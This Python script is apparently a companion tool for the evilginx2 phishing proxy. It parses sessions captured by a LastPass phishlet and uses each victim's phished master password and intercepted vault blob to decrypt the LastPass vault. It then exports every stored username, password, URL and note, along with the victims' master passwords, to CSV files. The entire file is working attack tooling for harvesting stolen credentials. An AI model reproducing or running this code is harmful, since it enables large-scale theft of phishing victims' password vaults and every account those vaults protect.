"""evilginx2 Lastpass Credential Parser

Usage:
  dump_lastpass.py <input_db> [--output=<output_prefix>] [--verbose] [--no-decrypt]

Options:
  -h --help                 Show this screen.
  --output=<output_prefix>  This is the prefix that will be used for 2 output files. 
                            For example: creds-dump.csv and creds-lastpass.csv [default: ./creds].
  --verbose
  --no-decrypt              Flag whether or not to decrypt the vault using the username and password
"""

from docopt import docopt
import json
import os
import lastpass
from  lastpass.parser import *
from  lastpass import parser
from lastpass import account
from base64 import b64decode
from lastpass.blob import Blob
import pandas as pd
import logging



FORMAT = '%(levelname)s:%(message)s'


def naive_parse_db(db_path):
    ret = {}

    with open(db_path) as f:
        for e in f:
            if not e.startswith('{'): continue
            e = json.loads(e)
            if not e['tokens'] or  e['phishlet'] != 'lastpass': 
                continue
            
            ret[e['id']] = e

    return ret

def parse_ACCT(chunk):
    """
    Parses an account chunk, decrypts and creates an Account object.
    May return nil when the chunk does not represent an account.
    All secure notes are ACCTs but not all of them strore account
    information.
    """
    # TODO: Make a test case that covers secure note account

    io = BytesIO(chunk.payload)
    id = read_item(io)
    name = read_item(io)
    group = read_item(io)
    url = decode_hex(read_item(io))
    notes = read_item(io)
    skip_item(io, 2)
    username = read_item(io)
    password = read_item(io)
    skip_item(io, 2)
    secure_note = read_item(io)

    return account.Account(id, name, username, password, url, group, notes)


def dump_session_credentials(session, no_decrypt = False):
    username = session['username']
    password = session['password']

    blob_encoded = session['tokens']['lastpass.com']['/getaccts.php']['Value']
    blob_decoded = b64decode(blob_encoded)
    iterations   = int(session['tokens']['lastpass.com']['/iterations.php']['Value'])

    blob = Blob(blob_decoded, iterations)


    vault = lastpass.Vault.open(blob, username, password)
    dump = []
    if not no_decrypt:
        for e in vault.accounts:
            dump.append({
                'session_id': session['id'],
                'lp_username': username,
                'id': e.id.decode("utf-8") ,
                'name': e.name.decode("utf-8") ,
                'group': e.group.decode("utf-8") ,
                'username': e.username.decode("utf-8") ,
                'password': e.password.decode("utf-8") ,
                'url': e.url.decode("utf-8") ,
                'notes': e.notes.decode("utf-8") 
            })
    else:
        for chunk in parser.extract_chunks(blob):
            if chunk.id != b'ACCT': continue
            e = parse_ACCT(chunk)
            dump.append({
                'session_id': session['id'],
                'lp_username': username,
                'id': e.id.decode("utf-8") ,
                'name': e.name,
                'group': e.group,
                'username': e.username,
                'password': e.password,
                'url': e.url,
                'notes': e.notes
            })
        
    return dump


def dump_all_credentials(sessions, no_decrypt = False):
    ret = []
    lp_ret = []
    for _, sess in sessions.items():
        logging.debug('Processing ({}): {}'.format(sess['id'], sess['username']))
        creds = dump_session_credentials(sess, no_decrypt)
        logging.debug('Total credentials found for ({}): {}'.format(len(creds), sess['id']))
        ret.extend(creds)

        lp_ret.append({
            'id': sess['id'],
            'lp_username': sess['username'],
            'lp_password': sess['password'],
            'credential_count': len(creds)
        })
    return ret, lp_ret





if __name__ == '__main__':
    arguments = docopt(__doc__)
    db_path = arguments['<input_db>']
    creds_prefix = arguments['--output']

    if arguments['--verbose']:
        logging.basicConfig(format=FORMAT, level=logging.DEBUG)
    else:
        logging.basicConfig(format=FORMAT, level=logging.INFO)

    logging.debug('Reading {}'.format(db_path))
    sessions = naive_parse_db(db_path)
    logging.debug('Total of {} sessions found'.format(len(sessions)))

    creds, lp_creds = dump_all_credentials(sessions, arguments['--no-decrypt'])

    creds_path = '{}-dump.csv'.format(creds_prefix)
    lp_path = '{}-lastpass.csv'.format(creds_prefix)


    df = pd.DataFrame(data=creds)
    logging.debug('Saving {} rows to {}'.format(len(df), creds_path))
    df.to_csv(creds_path, index=False)

    lp_df = pd.DataFrame(data=lp_creds)
    logging.debug('Saving {} rows to {}'.format(len(lp_df), lp_path))
    lp_df.to_csv(lp_path, index=False)
